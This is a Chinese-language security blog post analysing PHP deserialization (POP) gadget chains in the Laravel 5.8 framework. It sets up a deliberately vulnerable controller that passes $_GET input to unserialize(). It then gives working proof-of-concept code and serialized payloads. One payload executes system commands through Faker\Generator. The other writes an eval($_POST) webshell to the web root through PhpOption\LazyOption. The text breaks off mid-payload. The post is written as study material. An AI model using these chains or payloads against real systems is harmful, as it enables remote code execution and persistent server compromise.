<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>Laravel 5.8框架POP链分析-上 | Bantian</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Laravel 5.8框架POP链分析-上</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">June 2, 2020&nbsp;&nbsp;0:48:38</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>通过此次的学习，除了学习到了<strong>laravel</strong>框架中存在的反序列化现象，我觉得让我收获更多的是了解到了在构造POP链中的一些可能之前并没有注意到的小细节。</p>
<h3 id="0x01-Laravel框架介绍"><a href="#0x01-Laravel框架介绍" class="headerlink" title="0x01 Laravel框架介绍"></a>0x01 Laravel框架介绍</h3><p> Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。 其目录结构为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app:应用程序的核心代码，用户的业务逻辑主要在这个目录下</span><br><span class="line">	Http: 包含MVC中的Controller</span><br><span class="line">bootstrap: 框架启动和自动加载配置的文件</span><br><span class="line">config: 包含所有应用程序的配置文件，如缓存cache，数据库，队列和视图等</span><br><span class="line">database: 数据库迁移文件等</span><br><span class="line">public: 程序入口，以及项目的静态资源文件</span><br><span class="line">resources: 包含视图</span><br><span class="line">storage: 包含了编译后的模板文件，以及基于文件的session，log等</span><br><span class="line">tests: 单元测试框架</span><br><span class="line">vendor: 包含composer加载的依赖模块</span><br></pre></td></tr></table></figure>

<p>因为最近想要系统地学习一下反序列化漏洞，而Laravel框架中就有相对丰富的学习资料。</p>
<h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p>首先先安装<strong>Composer</strong>，将源先更换为阿里源：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>

<p>然后用<strong>Composer</strong>安装<strong>Laravel 5.8</strong>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel laravel58</span><br><span class="line"></span><br><span class="line">cd laravel58</span><br><span class="line"></span><br><span class="line">php artisan serve</span><br></pre></td></tr></table></figure>

<p>然后在文件<code>routes\web.php</code>中添加路由：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"/demo"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure>

<p>然后在<code>app\Http\Controllers\</code>文件夹下创建一个新的路由控制器<code>DemoController</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.8"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x03-POP链-1"><a href="#0x03-POP链-1" class="headerlink" title="0x03 POP链 1"></a>0x03 POP链 1</h3><p><strong>入口类</strong>：<code>Illuminate\Broadcasting\PendingBroadcast</code></p>
<p><strong>出口类</strong>：<code>Faker\Generator</code></p>
<p>入口在<code>Illuminate\Broadcasting\PendingBroadcast</code>类中的<code>__destruct()</code>魔术方法中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Events</span>\<span class="title">Dispatcher</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $events;</span><br><span class="line">    <span class="keyword">protected</span> $event;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Dispatcher $events, $event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>$this-&gt;event</code>和<code>$this-&gt;events</code>都是可以用户可控的。在<code>__destruct()</code>析构函数中调用了<code>$this-&gt;events</code>的<code>dispatch()</code>方法，所以<code>$this-&gt;events</code>应当是一个类，按照我们正常的思路，接下来就要去找全局查找有哪些类中存在同名<code>dispatch()</code>方法，看是不是可以调用，但是其实这里有两种处理方法：</p>
<ol>
<li>第一种就是通过全局搜索查找其他类中是否存在调用同名方法的情况；</li>
<li>第二种就是查找<code>__call()</code>魔术方法，在对象中调用一个不可访问或者不存在的方法时，<code>__call()</code>方法就会被调用，具体可以参考PHP手册： <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.overloading.php#object.call</a> </li>
</ol>
<p>所以第一条比较简单的POP链就是通过触发其他类中的<code>__call()</code>方法来进行的。</p>
<p>在<code>Faker\Generator</code>中发现存在可利用的<code>__call()</code>方法，令<code>$this-&gt;events</code>为<code>Faker\Generator</code>的实例化对象，然后在<code>PendingBroadcast</code>类析构时触发<code>__destruct()</code>魔术函数，会调用<code>$this-&gt;events</code>对应对象的<code>dispatch()</code>方法，因为<code>Faker\Generator</code>类不存在该方法，就会触发<code>__call</code>方法：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/1.png" alt="1"></p>
<p>这里的<code>__call()</code>方法有两个参数，<code>$method</code>表示触发该魔术方法的方法名，这个case中就是<code>dispatch</code>；<code>$attributes</code>是一个数组，表示的是传入<code>dispatch</code>的参数，也就是这里的<code>$this-&gt;event</code>对应的参数。用exp跟踪一下就能看到：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/15.png" alt="15"></p>
<p>继续跟进<code>$this-&gt;format($method, $attributes)</code>：</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/2.png" alt="2"></p>
<p>看到了我们的目标<code>call_user_func_array</code>，该函数能够调用回调函数，并把一个数组参数作为回调函数的参数，当我们调用的回调函数的参数类型及个数是未知的时候，该方法就很方便。所以可以推测的是，<code>$this-&gt;getFormatter($famatter)</code>的返回值是一个回调函数。</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/3.png" alt="3"></p>
<p>poc：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">event</span>;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $b = new Faker\Generator(array('dispatch' =&gt; 'system'));</span><br><span class="line">    $a = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($b, <span class="string">'ls -al'</span>);</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line">    <span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>放在<code>public/</code>目录下，访问<code>public/exp.php</code>得到exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"*event"</span>;s:<span class="number">6</span>:<span class="string">"ls -al"</span>;s:<span class="number">9</span>:<span class="string">"*events"</span>;O:<span class="number">15</span>:<span class="string">"Faker\Generator"</span>:<span class="number">1</span>:&#123;s:<span class="number">13</span>:<span class="string">"*formatters"</span>;a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">"dispatch"</span>;s:<span class="number">6</span>:<span class="string">"system"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后将对象类型小写的<code>s</code>转换成大写的<code>S</code>，并在保护字段的前面加上<code>\00*\00</code>，就变成了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">40</span>:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:<span class="number">2</span>:&#123;S:<span class="number">8</span>:<span class="string">"\00*\00event"</span>;S:<span class="number">6</span>:<span class="string">"ls -al"</span>;S:<span class="number">9</span>:<span class="string">"\00*\00events"</span>;O:<span class="number">15</span>:<span class="string">"Faker\Generator"</span>:<span class="number">1</span>:&#123;S:<span class="number">13</span>:<span class="string">"\00*\00formatters"</span>;a:<span class="number">1</span>:&#123;S:<span class="number">8</span>:<span class="string">"dispatch"</span>;S:<span class="number">6</span>:<span class="string">"system"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是最简单，最不会出错的方式就是在输出序列化后字符串时候进行一个<code>urlencode</code>，即<code>echo urlencode(serialize($a));</code>。</p>
<p>最后得到</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/4.png" alt="4"></p>
<h4 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h4><p>我们知道可能会存在这么一种情况，一些服务器处于安全方面的考量，在<code>php.ini</code>的<code>disable_functions</code>中禁掉很多执行系统命令的函数，比如我们常用的<code>system</code>、<code>proc_open</code>、<code>shell_exec</code>等。这个时候我们就可以尝试写入一个shell，然后用其他的方法bypass disable_functions。</p>
<p>因为<code>call_user_func_array</code>可以利用回调函数处理数组，所以可以这样来写入shell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(<span class="string">'file_put_contents'</span>, <span class="keyword">array</span>(<span class="string">'/var/www/html/shell.php'</span>, <span class="string">'&lt;? eval($_POST[1]);?&gt;'</span>));</span><br></pre></td></tr></table></figure>

<p>但是这里的<code>$format()</code>函数中的<code>call_user_func_array</code>的第2个参数<code>$arguments</code>其实是来自<code>__call($method, $attributes)</code>中的<code>$attributes</code>，是一个数组，同时该参数向上回溯，其实是<code>PendingBroadcast</code>类的<code>$this-&gt;event</code>参数，如果我们想要写入shell，就会这样构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $b = new Faker\Generator(array('dispatch' =&gt; 'file_put_contents'));</span><br><span class="line">    $a = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($b, <span class="keyword">array</span>(<span class="string">'/var/www/html/shell.php'</span>, <span class="string">'&lt;?php eval($_POST[1]);'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这样构造，传入<code>Generator</code>类的<code>__call()</code>函数，就会令<code>$attributes</code>，也就是<code>call_user_func_array</code>中的<code>$arguments</code>参数变成一个二维数组。就不能正确执行原来的写shell命令了。</p>
<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/imgs/16.png" alt="16"></p>
<p>所以现在需要重新找一个类，该类须有可利用的函数，然后直接调用该类的方法（后面会比较详细地介绍）。类<code>PhpOption\LazyOption</code>中存在可利用的危险函数<code>call_user_func_array</code>，然后通过<code>class_user_func_array(array($a, &#39;aaa&#39;));</code>的方式调用类<code>a</code>的<code>aaa()</code>方法，而且参数<code>$this-&gt;callback</code>和<code>$this-&gt;arguments</code>都是用户可控的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpOption</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyOption</span> <span class="keyword">extends</span> <span class="title">Option</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $callback;</span><br><span class="line">    <span class="keyword">private</span> $arguments;</span><br><span class="line">    <span class="keyword">private</span> $option;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">option</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;option) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;option = call_user_func_array(<span class="keyword">$this</span>-&gt;callback, <span class="keyword">$this</span>-&gt;arguments);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;option <span class="keyword">instanceof</span> Option) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;option = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \RuntimeException(sprintf(<span class="string">'Expected instance of \%s'</span>, Option::class));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是因为这里<code>option()</code>方法是类<code>PhpOption\LazyOption</code>的一个私有方法，所以无法被直接调用，但是其他的<code>public</code>方法都是通过<code>$this-&gt;option()</code>调用的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isDefined</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option()-&gt;isDefined();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option()-&gt;isEmpty();</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($callable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;option()-&gt;filter($callable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最后的poc为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">event</span>;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpOption</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyOption</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">        <span class="keyword">private</span> $arguments;</span><br><span class="line">        <span class="keyword">private</span> $option;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback, $arguments, $option)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;arguments = $arguments;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;option = $option;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $lazyOption = new PhpOption\LazyOption('file_put_contents', array('/var/www/html/shell.php', '&lt;? eval($_POST[1]);'), null);</span><br><span class="line">    $generator = <span class="keyword">new</span> Faker\Generator(<span class="keyword">array</span>(<span class="string">'dispatch'</span> =&gt; <span class="keyword">array</span>($lazyOption, <span class="string">'filter'</span>)));</span><br><span class="line">    $pendingBroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($generator, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingBroadcast));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>$b = new Illuminate\Broadcasting\BroadcastEvent(&#39;abc&#39;);</code>中的<code>abc</code>是任意一个参数，因为<code>PhpOption\LazyOption</code>的<code>filter</code>方法接受一个参数。</p>
<p>得到exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>Faker%<span class="number">5</span>CGenerator%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>formatters%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>dispatch%<span 